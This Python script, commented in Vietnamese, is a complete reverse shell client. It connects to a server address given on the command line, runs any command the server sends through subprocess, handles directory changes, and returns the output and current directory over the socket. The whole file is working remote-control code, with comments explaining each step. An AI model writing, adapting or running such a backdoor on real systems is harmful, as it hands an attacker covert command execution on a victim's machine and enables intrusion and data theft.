import socket , os , subprocess , sys 

SERVER_HOST = sys.argv[1] # Lấy địa chỉ IP của server từ command line argument
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.connect((SERVER_HOST , SERVER_PORT)) 
cwd = os.getcwd() # lấy thư mục hiện tại của client
s.send(cwd.encode()) # gửi thư mục hiện tại đến server
while True : 
    command = s.recv(BUFFER_SIZE).decode() # nhận lệnh từ server
    splited_command = command.split() # tách lệnh để xử lý
    if command.lower() == "exit" : 
        break
    if splited_command[0].lower() == "cd" :
        try :
            os.chdir(" ".join(splited_command[1:])) # thay đổi thư mục
        except FileNotFoundError as e :
            output = str(e) 
        else :
            output = "" # nếu không có lỗi thì output rỗng
    else :
        # thực thi lệnh và nhận kết quả 
        output = subprocess.getoutput(command)
    # lấy thư mục hiện tại 
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode()) # gửi kết quả và thư mục hiện tại đến server
s.close()

# kiểm tra xem câu lệnh có phải là cd - thì thay đổi thư mục bằng module os 
# bởi vì subprocess không thể thay đổi thư mục hiện tại của chương trình - nó chỉ thay đổi thư mục trong quá trình con 